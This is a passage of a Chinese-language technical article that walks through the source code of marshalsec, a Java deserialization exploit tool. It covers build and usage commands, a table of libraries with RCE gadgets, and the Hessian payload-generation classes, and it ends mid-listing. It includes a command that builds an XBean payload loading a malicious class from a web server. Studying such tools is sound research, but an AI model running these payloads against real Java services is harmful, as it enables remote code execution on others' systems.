### 0x00 前言
#### 1\. 描述
官方github描述：
    Java Unmarshaller Security - Turning your data into code execution
“将数据转换为代码执行”，我对其理解就是，在java反序列化时，利用序列化数据造成代码执行攻击。
* * *
It's been more than two years since Chris Frohoff and Garbriel Lawrence have
presented their research into Java object deserialization vulnerabilities
ultimately resulting in what can be readily described as the biggest wave of
remote code execution bugs in Java history.
译：  
_Chris Frohoff和Garbriel
Lawrence对Java对象反序列化漏洞的研究已经有两年多了，他们的研究最终导致了Java历史上最大的远程代码执行错误浪潮。_
Research into that matter indicated that these vulnerabilities are not
exclusive to mechanisms as expressive as Java serialization or XStream, but
some could possibly be applied to other mechanisms as well.
译：  
_对这个问题的研究表明，这些漏洞并不局限于像Java序列化或XStream这样具有表现力的机制，但是一些漏洞也可能适用于其他机制。_
This paper presents an analysis, including exploitation details, of various
Java open-source marshalling libraries that allow(ed) for unmarshalling of
arbitrary, attacker supplied, types and shows that no matter how this process
is performed and what implicit constraints are in place it is prone to similar
exploitation techniques.
译：  
_本文对各种Java开放源码编组库进行了分析(包括利用细节)，这些编组库允许对任意攻击者提供的类型进行编组，并说明了无论如何执行这个过程以及存在哪些隐含的约束，都很容易出现类似的利用技术。_
* * *
总而言之，marshalsec就是生成一定编码的数据，在jvm对其进行解码时，执行预置的代码。
#### 2\. 使用方法
marshalsec使用：
要求使用java8进行编译，在github把[marshalsec](https://github.com/threedr3am/marshalsec)项目clone下来后，执行maven指令`mvn
clean package -DskipTests`进行编译，生成可执行jar包使用
    java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec. [-a] [-v] [-t] [ []]
  * -a：生成exploit下的所有payload（例如：hessian下的SpringPartiallyComparableAdvisorHolder, SpringAbstractBeanFactoryPointcutAdvisor, Rome, XBean, Resin）
  * -t：对生成的payloads进行解码测试
  * -v：verbose mode, 展示生成的payloads
  * gadget_type：指定使用的payload
  * arguments - payload运行时使用的参数
#### 3\. 目前支持的exploit和payload
Marshaller | Gadget Impact  
---|---  
BlazeDSAMF(0|3|X) | JDK only escalation to Java serialization  
various third party libraries RCEs  
Hessian|Burlap | various third party RCEs  
Castor | dependency library RCE  
Jackson | **possible JDK only RCE** , various third party RCEs  
Java | yet another third party RCE  
JsonIO | **JDK only RCE**  
JYAML | **JDK only RCE**  
Kryo | third party RCEs  
KryoAltStrategy | **JDK only RCE**  
Red5AMF(0|3) | **JDK only RCE**  
SnakeYAML | **JDK only RCEs**  
XStream | **JDK only RCEs**  
YAMLBeans | third party RCE  
... | ...  
本章讲述了marshalsec的一些情况以及怎么编译和使用，那么，后面的章节，我将会以我一贯对源码的浅析习惯进行讲解marshalsec的一些原理。
* * *
### 0x01 marshalsec源码浅析
在将源码前，我们先了解一下marshalsec的目录结构：
    ├── BlazeDSAMF0.java
    ├── BlazeDSAMF3.java
    ├── BlazeDSAMF3AM.java
    ├── BlazeDSAMFX.java
    ├── BlazeDSBase.java
    ├── BlazeDSExternalizableBase.java
    ├── Burlap.java
    ├── Castor.java
    ├── DubboHessian.java
    ├── EscapeType.java
    ├── Hessian.java
    ├── Hessian2.java
    ├── HessianBase.java
    ├── HessianBase2.java
    ├── JYAML.java
    ├── Jackson.java
    ├── Java.java
    ├── JsonIO.java
    ├── Kryo.java
    ├── KryoAltStrategy.java
    ├── MarshallerBase.java
    ├── Red5AMF0.java
    ├── Red5AMF3.java
    ├── Red5AMFBase.java
    ├── SideEffectSecurityManager.java
    ├── SnakeYAML.java
    ├── TestingSecurityManager.java
    ├── UtilFactory.java
    ├── XStream.java
    ├── YAMLBase.java
    ├── YAMLBeans.java
    ├── gadgets
    │   ├── Args.java
    │   ├── BindingEnumeration.java
    │   ├── C3P0RefDataSource.java
    │   ├── C3P0WrapperConnPool.java
    │   ├── ClassFiles.java
    │   ├── CommonsBeanutils.java
    │   ├── CommonsConfiguration.java
    │   ├── Gadget.java
    │   ├── GadgetType.java
    │   ├── Groovy.java
    │   ├── ImageIO.java
    │   ├── JDKUtil.java
    │   ├── JdbcRowSet.java
    │   ├── LazySearchEnumeration.java
    │   ├── MockProxies.java
    │   ├── Primary.java
    │   ├── Resin.java
    │   ├── ResourceGadget.java
    │   ├── Rome.java
    │   ├── ScriptEngine.java
    │   ├── ServiceLoader.java
    │   ├── SpringAbstractBeanFactoryPointcutAdvisor.java
    │   ├── SpringPartiallyComparableAdvisorHolder.java
    │   ├── SpringPropertyPathFactory.java
    │   ├── SpringUtil.java
    │   ├── Templates.java
    │   ├── TemplatesUtil.java
    │   ├── ToStringUtil.java
    │   ├── UnicastRefGadget.java
    │   ├── UnicastRemoteObjectGadget.java
    │   ├── XBean.java
    │   └── XBean2.java
    ├── jndi
    │   ├── LDAPRefServer.java
    │   └── RMIRefServer.java
    └── util
        └── Reflections.java
目录展示稍微有点长，其中，package根目录下的类文件，都是对gadgets目录下payload进行利用的类文件，如果不太严谨的话，我们可以称之为exploits。可以看到目录下相对于官方原有的多了一些java文件，其中DubboHessian.java、Hessian2.java、HessianBase2.java还有gadgets下的XBean2.java就是我对其进行改造支持attack
dubbo-hessian2的一些产物。
我们看看第一章节所说的执行指令：
    java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec. [-a] [-v] [-t] [ []]
其中[-a] [-v] [-t] [
[]]在第一章中也对其进行详细的描述了，我们再来看看marshalsec.，这个参数是什么意思呢？
这个就是我们上面所说的exploits的指定，也就是我们上面展示的目录，根目录下的java文件名，假如我们想要生成hessian的Xbean的payload，我们就只要执行：
    java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.Hessian -v XBean http://127.0.0.1:8080/ ExecObject
执行之后，就能生成一个攻击Hessian的XBean gadget，后面的`http://127.0.0.1:8080/
ExecObject`表示的是恶意class所在web资源服务器地址以及其类名。
那么，这个payload的生成牵涉到的源码到底是如何执行的呢？别急，让我慢慢一一给你讲解。
我们跟进Hessian.java这个类文件：
    public class Hessian extends HessianBase {
        /**
         * {@inheritDoc}
         *
         * @see marshalsec.AbstractHessianBase#createOutput(java.io.ByteArrayOutputStream)
         */
        @Override
        protected AbstractHessianOutput createOutput ( ByteArrayOutputStream bos ) {
            return new HessianOutput(bos);
        }
        /**
         * {@inheritDoc}
         *
         * @see marshalsec.AbstractHessianBase#createInput(java.io.ByteArrayInputStream)
         */
        @Override
        protected AbstractHessianInput createInput ( ByteArrayInputStream bos ) {
            return new HessianInput(bos);
        }
        public static void main ( String[] args ) {
            new Hessian().run(args);
        }
    }
可以看到，其中代码并不多，Hessian这个类继承了HessianBase并重写了createOutput和createInput方法，看方法内容可以发现，分别是生成了Hessian的输出和输入流对象，那么，这两个流对象究竟何用？继续跟进其父类HessianBase看看：
    public abstract class HessianBase extends MarshallerBase
            implements SpringPartiallyComparableAdvisorHolder, SpringAbstractBeanFactoryPointcutAdvisor, Rome, XBean, Resin {
        /**
         * {@inheritDoc}
         *
         * @see marshalsec.MarshallerBase#marshal(java.lang.Object)
         */
        @Override
        public byte[] marshal ( Object o ) throws Exception {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            AbstractHessianOutput out = createOutput(bos);
            NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
            sf.setAllowNonSerializable(true);
            out.setSerializerFactory(sf);
            out.writeObject(o);
            out.close();
            return bos.toByteArray();
        }
        /**
         * {@inheritDoc}
         *
         * @see marshalsec.MarshallerBase#unmarshal(java.lang.Object)
         */
        @Override
        public Object unmarshal ( byte[] data ) throws Exception {
            System.out.println(Base64.getEncoder().encodeToString(data));
            ByteArrayInputStream bis = new ByteArrayInputStream(data);
            AbstractHessianInput in = createInput(bis);
            return in.readObject();
        }
        /**
         * @param bos
         * @return
         */
        protected abstract AbstractHessianOutput createOutput ( ByteArrayOutputStream bos );
        protected abstract AbstractHessianInput createInput ( ByteArrayInputStream bos );
        public static class NoWriteReplaceSerializerFactory extends SerializerFactory {
            /**
             * {@inheritDoc}
             *
             * @see com.caucho.hessian.io.SerializerFactory#getObjectSerializer(java.lang.Class)
             */
            @Override
            public Serializer getObjectSerializer ( Class cl ) throws HessianProtocolException {
                return super.getObjectSerializer(cl);
            }
            /**
             * {@inheritDoc}
             *
             * @see com.caucho.hessian.io.SerializerFactory#getSerializer(java.lang.Class)
             */
            @Override
            public Serializer getSerializer ( Class cl ) throws HessianProtocolException {
                Serializer serializer = super.getSerializer(cl);
                if ( serializer instanceof WriteReplaceSerializer ) {
                    return UnsafeSerializer.create(cl);
                }
                return serializer;
            }
        }
    }
看到这里，就能理解在它的子类Hessian中重写的createOutput和createInput的意义了，原来它们都是HessianObject的抽象方法，其子类Hessian只是对其进行了实现，然后在marshal和unmarshal方法中分别调用生成流对象用于输出序列化数据和反序列化数据
    NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
    sf.setAllowNonSerializable(true);
    out.setSerializerFactory(sf);
而这部分代码，对输出流进行了设置，因为我们知道，一般对于对象的序列化，如果对象对应的class没有对java.io.Serializable进行实现implement的话，是没办法序列化的，所以这里对输出流进行了设置，使其可以输出没有实现java.io.Serializable接口的对象
接着，看回marshalsec.Hessian#main
    public static void main ( String[] args ) {
        new Hessian().run(args);
    }
我们可以发现，执行了Hessian的run方法，我们对其进行跟入，可以看到是MarshallerBase这个抽象类的一个实现方法，MarshallerBase是所有exploits的父类，为所有exploits提供了run方法用于执行。
    protected void run ( String[] args ) {
        try {
            boolean test = false;
            boolean all = false;
            boolean verbose = false;
            EscapeType escape = EscapeType.NONE;
            int argoff = 0;
            GadgetType type = null;
            //对-前缀的参数进行解析读取
            while ( argoff  argoff ) {
                    type = GadgetType.valueOf(args[ argoff ].trim());
                    argoff++;
                }
            }
            catch ( IllegalArgumentException e ) {
                System.err.println("Unsupported gadget type " + args[ argoff ]);
                System.exit(-1);
            }
            //...
        }
        catch ( Exception e ) {
            e.printStackTrace(System.err);
        }
    }
这部分代码是对payload段参数进行读取解析，若不存在则直接抛出异常，而payload段参数其实就是指令中的XBean
    java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.Hessian -v XBean http://127.0.0.1:8080/ ExecObject
    protected void run ( String[] args ) {
        try {
            //...
            //指定了-a参数，则执行生成exploits下的所有payloads
            if ( all ) {
                runAll(test, verbose, false, escape);
            }
            else {
                //没有指定-a参数，则只执行生成指定的payload，并把payload使用的参数复制出来传入使用
                String[] gadgetArgs = new String[args.length - argoff];
                System.arraycopy(args, argoff, gadgetArgs, 0, args.length - argoff);
                doRun(type, test, verbose, false, escape, gadgetArgs);
            }
        }
        catch ( Exception e ) {
            e.printStackTrace(System.err);
        }
    }
这段代码是真正的执行处，前面都是对参数的解析，以及payload生成类的读取
我们跟进runAll：
    private void runAll ( boolean test, boolean verbose, boolean throwEx, EscapeType escape ) throws Exception {
        for ( GadgetType t : this.getSupportedTypes() ) {
            Method tm = getTargetMethod(t);
            Args a = tm.getAnnotation(Args.class);
            if ( a == null ) {
                throw new Exception("Missing Args in " + t);
            }
            if ( a.noTest() ) {
                continue;
            }
            String[] defaultArgs = a.defaultArgs();
            doRun(t, test, verbose, throwEx, escape, defaultArgs);
        }
    }
可以看到，其实最终还是执行doRun，只不过runAll是遍历当前类所支持的所有gadget，一个一个的去doRun
看getSupportedTypes方法源码：
    public GadgetType[] getSupportedTypes () {
        List types = new LinkedList<>();
        for ( GadgetType t : GadgetType.values() ) {
            if ( t.getClazz().isAssignableFrom(this.getClass()) ) {
                types.add(t);
            }
        }
        return types.toArray(new GadgetType[types.size()]);
    }
清楚的看到，其实该类支持的gadget都是从GadgetType中取出来的，分析一下GadgetType：
    public enum GadgetType {